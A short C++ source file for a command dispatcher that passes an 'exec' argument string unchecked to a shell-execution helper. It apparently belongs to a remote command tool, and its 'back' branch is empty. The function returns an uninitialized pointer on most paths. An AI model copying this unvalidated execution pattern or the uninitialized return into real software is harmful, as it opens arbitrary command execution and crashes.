//
// Created by stdout on 2021/4/5.
//

#include "CommandExecutor.h"



dktb::BUFFER *CommandExecutor::dealWithCommand(char* command, char* args) {
    dktb::BUFFER *result;

    if (!strncmp(command, "exec", 4)) {
        if (strlen(args) != 0) {
            result = dktb::ExecuteCommand(args);
        }
    } else if (!strncmp(command, "back", 4)) {

    }
    return result;
}
